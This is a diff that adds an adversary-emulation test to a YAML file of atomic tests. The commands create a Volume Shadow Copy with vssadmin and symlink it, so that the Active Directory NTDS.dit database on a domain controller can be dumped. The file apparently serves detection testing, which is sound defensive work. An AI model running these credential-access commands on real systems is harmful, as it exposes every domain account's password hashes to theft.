@@ -153,3 +153,27 @@ atomic_tests:
       (gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')
     name: powershell
     elevation_required: true
+
+- name: Create Symlink to Volume Shadow Copy
+  auto_generated_guid: 21748c28-2793-4284-9e07-d6d028b66702
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.
+  supported_platforms:
+  - windows
+  input_arguments:
+    drive_letter:
+      description: Drive letter to source VSC (including colon)
+      type: String
+      default: 'C:'
+    symlink_path:
+      description: symlink path
+      type: String
+      default: 'C:\Temp\vssstore'
+  executor:
+    command: |
+      vssadmin.exe create shadow /for=#{drive_letter}
+      mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+    name: command_prompt
+    elevation_required: true
